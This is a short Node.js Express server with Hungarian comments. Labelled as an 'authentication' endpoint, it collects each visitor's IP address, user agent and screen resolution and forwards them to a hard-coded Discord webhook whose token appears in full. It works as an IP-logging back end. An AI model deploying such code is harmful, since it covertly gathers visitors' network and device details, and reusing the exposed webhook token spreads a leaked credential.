const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors()); // Engedélyezi a Netlify-ról érkező kéréseket

// Discord Webhook URL - Ide illeszd be a sajátodat
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1517503979897229382/vNT7mGlYGOxSCv3tM8IMnDRB_ASKolbdEMsoD49BbF_AWT792vOscJy3nhbTdx5dN8xA';

app.post('/hitelesit', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const data = req.body;

        // Üzenet összeállítása a Discordnak
        const discordMessage = {
            embeds: [{
                title: "Új Látogató / Hitelesítés",
                color: 0x00ff41, // Neon zöld
                fields: [
                    { name: "IP Cím", value: ip, inline: true },
                    { name: "User Agent", value: data.ua },
                    { name: "Képernyő", value: data.res }
                ],
                timestamp: new Date()
            }]
        };

        await axios.post(DISCORD_WEBHOOK_URL, discordMessage);
        res.status(200).send('Adatok elküldve');
    } catch (error) {
        console.error(error);
        res.status(500).send('Hiba történt');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Szerver fut a ${PORT}-os porton`));